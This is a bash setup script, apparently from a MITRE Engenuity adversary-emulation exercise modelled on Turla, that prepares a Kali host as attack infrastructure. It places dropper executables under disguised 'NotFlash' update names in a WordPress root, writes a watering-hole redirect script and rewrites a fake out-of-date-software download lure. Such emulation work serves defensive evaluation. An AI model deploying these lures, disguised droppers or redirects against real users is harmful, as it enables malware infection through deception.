#!/usr/bin/env bash

# ---------------------------------------------------------------------------
# kali-update.sh - Update Kali box, ensure proper configuration, dependencies installed, and proper executables in place. 

# Copyright 2023 MITRE Engenuity. Approved for public release. Document number CT0005.
# Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in 
# compliance with the License. You may obtain a copy of the License at
# http://www.apache.org/licenses/LICENSE-2.0
# Unless required by applicable law or agreed to in writing, software distributed under the License 
# is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express 
# or implied. See the License for the specific language governing permissions and limitations under the License.

# This project makes use of ATT&CK®
# ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 

# Usage: kali-update.sh

# --------------------------------------------------------------------------- 

# Do git pull, and put files in proper place on disk
day1_dir="/opt/day1/turla"
day2_dir="/opt/day2/turla"

dev_user="dev"

http_src_file="${day1_dir}/Resources/SimpleDropper/SimpleDropper/bin/SimpleDropper_http.exe"
https_src_file="${day1_dir}/Resources/SimpleDropper/SimpleDropper/bin/SimpleDropper_https.exe"
http_dest_file="/srv/www/wordpress/NTFVersion.exe"
https_dest_file="/srv/www/wordpress/NFVersion_5e.exe"

# counter file
counter_file="/opt/watering_hole/counter.js"
tstamp=$(date +"%Y%m%d%H%M")

# Check if running as sudo
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit 1
fi

echoerr() { printf "%s\n" "$*" >&2 ; }
log()    { echoerr "[LOG]    $*" ; }

fix_hostname() {
  # set hostname
  sed -i 's@preserve_hostname: false@preserve_hostname: true@g' /etc/cloud/cloud.cfg
  sed -i '/^preserve_hostname: true/ahostname: modin' /etc/cloud/cloud.cfg
  hostnamectl set-hostname modin
  echo '176.59.15.33    modin' >> /etc/hosts
}

cfg_tuned() {
  apt update
  DEBIAN_FRONTEND=noninteractive apt install -y tuned
  systemctl enable --now tuned
  tuned-adm profile throughput-performance
  tuned-adm active
}

file_compare() {
  local src_file=$1
  local dest_file=$2
  # verify file copies
  if cmp -s "${src_file}" "${dest_file}"; then
   log "file ${dest_file} verified"
else
   log "ERROR -- ${dest_file} -- ERROR - NOT COPIED CORRECTLY, FILES DO NOT MATCH"
fi
}

update_git() {
  (cd ${day1_dir} || exit;
   log "updating ${day1_dir}...")

  (cd ${day2_dir} || exit;
   log "updating ${day2_dir}...")
}

update_dropper_files() {
  # copy not flash files to proper locations
  log "copying files to proper locations"
  cp -f ${http_src_file} ${http_dest_file}
  cp -f ${https_src_file} ${https_dest_file}
  file_compare ${http_src_file} ${http_dest_file}
  file_compare ${https_src_file} ${https_dest_file}

}

fix_ownership() {
  chown -R dev:dev /srv/www/wordpress
  chown -R dev:dev /opt/day1
  chown -R dev:dev /opt/day2
}

fix_counter_file() {
  mv -f ${counter_file} ${counter_file}."${tstamp}"
cat <<EOF > ${counter_file}
window.location.replace("http://anto-int.com")    // change to address of watering hole host
EOF
}

install_pip_deps() {
  # install pip requirements
  su - ${dev_user} -c "pip3 install -r ${day1_dir}/Resources/Penquin/requirements.txt"
  su - ${dev_user} -c "pip3 install pyndiff==1.0.2"
}

fix_download_link() {
  # fix kali flash update to point to right place
  sed -i "s|<a href.*|<a href="NFVersion_5e.exe"><h2>Warning: your NotFlash installation is out of date. Click here to update:</h2></a>|g" /srv/www/wordpress/flash_update.html
}

main() {
  log "Starting execution"
  log "fixing hostname"
  fix_hostname
  log "updating git"
  update_git
  log "updating dropper files"
  update_dropper_files
  log "fixing counter files"
  fix_counter_file
  log "fixing download link in flash_update file"
  fix_download_link
  log "installing pip deps"
  install_pip_deps
  log "resetting ownership"
  fix_ownership
  log "tuning the box"
  cfg_tuned
  log "done"
}

# execute everything
main
